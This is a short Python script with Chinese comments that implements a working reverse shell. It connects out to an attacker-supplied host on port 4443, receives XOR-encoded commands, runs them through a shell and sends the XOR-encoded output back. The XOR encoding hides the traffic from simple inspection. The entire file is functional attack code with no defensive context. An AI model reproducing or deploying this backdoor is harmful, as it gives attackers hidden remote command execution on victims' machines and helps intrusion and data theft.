import socket,subprocess,sys
 
RHOST = sys.argv[1] # 获取输入的参数值 比如：python a.py zhang 获取zhang
RPORT = 4443
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
 
while True:
     # 从socket中接收XOR编码的数据
     #接收
     data = s.recv(1024) 
     #print('data:',type(data)) '''     print('data:',type(data))'''
 
     # XOR the data again with a '\x41' to get back to normal data
     en_data = bytearray(data)
     #print('en_data:',type(en_data)) '''          en_data: <class 'bytearray'>'''
     for i in range(len(en_data)):
       en_data[i] ^=0x41

     # 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量
     comm = subprocess.Popen(en_data.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     #等待任务执行完
     comm.wait()
     #STDOUT为标准输出
     STDOUT, STDERR = comm.communicate()
 
     # 输出编码后的数据并且发送给指定的主机RHOST
     en_STDOUT = bytearray(STDOUT)
     for i in range(len(en_STDOUT)):
       en_STDOUT[i] ^=0x41
     print(en_STDOUT)
     s.send(en_STDOUT)
s.close()